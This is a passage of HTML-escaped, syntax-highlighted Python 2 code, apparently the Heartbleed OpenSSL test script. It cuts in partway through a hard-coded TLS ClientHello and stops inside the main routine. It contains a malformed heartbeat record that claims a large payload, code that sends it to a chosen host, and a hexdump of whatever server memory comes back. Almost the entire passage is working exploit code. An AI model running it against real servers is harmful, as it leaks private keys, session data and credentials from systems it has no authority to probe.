&lt;span class=&quot;s&quot;&gt;03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 0f 00 01 01                                  &lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;18 03 02 00 03&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;01 40 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%02X&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;  &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%04x&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%-48s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# EOF?&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt;
        

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Unexpected EOF receiving record header - server closed connection&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;gt;BHH&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Unexpected EOF receiving record payload - server closed connection&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39; ... received message: type = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, ver = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%04x&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, length = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;No heartbeat response received, server likely not vulnerable&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Received heartbeat response:&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;WARNING: server returned more data than it should - server is vulnerable!&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server processed malformed heartbeat, but did not return any extra data.&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Received alert:&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server returned error, likely not vulnerable&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Connecting...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Sending Client Hello...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Waiting for Server Hello...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
